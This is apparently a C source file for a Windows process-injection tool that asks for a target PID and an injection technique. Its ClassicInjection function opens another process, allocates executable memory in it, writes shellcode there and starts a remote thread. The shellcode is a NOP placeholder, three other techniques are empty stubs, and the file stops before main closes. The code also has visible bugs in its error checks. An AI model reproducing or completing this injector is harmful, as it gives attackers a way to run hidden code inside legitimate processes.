#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

int CrawlProcess(int pid) {
	DWORD LastErr;
	PROCESSENTRY32 pe32;
	HANDLE CThp32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (LastErr = GetLastError() != 0) {
		printf("[!] CreateToolhelp32Snapshot : Error %d\n", LastErr);
	}
	else {
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(CThp32, &pe32)) {
			printf("[-] Process32First : Error %d\n", GetLastError());
		}
		else {
			do {
				if (pe32.th32ProcessID == pid) {
					return 0;
				}
			} while (Process32Next(CThp32, &pe32));
		}
	}
	return -1;
}

void ClassicInjection(int pid) {
	char * shellcode = "\x90\x90\x90";
	HANDLE op = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (GetLastError() != 0) {
		printf("[!] OpenProcess : Error %d\n", GetLastError());
	}
	else {
		printf("[+] Opened process with PID : %d\n", pid);
		LPVOID WINAPI valloc = VirtualAllocEx(op, NULL, 50, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (GetLastError() != 0) {
			printf("[!] VirtualAllocEx : Error %d\n", GetLastError());
		}
		else {
			printf("[+] Allocated %d bytes in the remote process\n", 50);
			SIZE_T written;
			char *buff = calloc(strlen(shellcode) + 1, sizeof(char));
			strcpy(buff, shellcode);
			BOOL WINAPI writeprocmem = WriteProcessMemory(op, valloc, (LPCVOID)buff, strlen(shellcode), &written);
			if (GetLastError() != 0) {
				printf("[!] WriteProcessMemory : Error %d\n", GetLastError());
			}
			else {
				printf("[+] Written %d bytes in the remote process\n", written);
				HANDLE crthread = CreateRemoteThreadEx(op, NULL, 0, valloc, NULL, 0x0, NULL, NULL);
				if (GetLastError() != 0){
					printf("[!] CreateRemoteThreadEx : Error %d\n", GetLastError());
				}
				else
				{
					printf("[+] Sucessfully Injected PID [%d] with ClassicInjection\n", pid);
				}
			}
		}
	}
}

void ProcessHollowing(int pid) {

}

void ProcessDoppelGänging(int pid) {

}

void CtrlInject(int pid) {

}

int main()
{
	int pid_inject, inject_tech;
	printf("[-] PID to inject: ");
	scanf("%d", &pid_inject);
	printf("[-] Injection type:\n");
	printf("    - 1 : ClassicInjection;\n");
	printf("    - 2 : ProcessHollowing;\n");
	printf("    - 3 : ProcessDoppelGänging;\n");
	printf("    - 4 : CtrlInject;\n");
	scanf("%d", &inject_tech);
	if (CrawlProcess(pid_inject) == 0) {
		switch (inject_tech) {
		case 1:
			printf("[+] Starting ClassicInjection\n");
			ClassicInjection(pid_inject);
			break;
		case 2:
			printf("[+] Starting ProcessHollowing\n");
			ProcessHollowing(pid_inject);
			break;
		case 3:
			printf("[+] Starting ProcessDoppelGänging\n");
			ProcessDoppelGänging(pid_inject);
			break;
		case 4:
			printf("[+] Starting CtrlInject\n");
			CtrlInject(pid_inject);
			break;
		default:
			printf("[!] Invalid choice");
			break;
		}
	}else {
		printf("[!] Process not found");
	}
	printf("[+] Exiting...");
	system("pause");
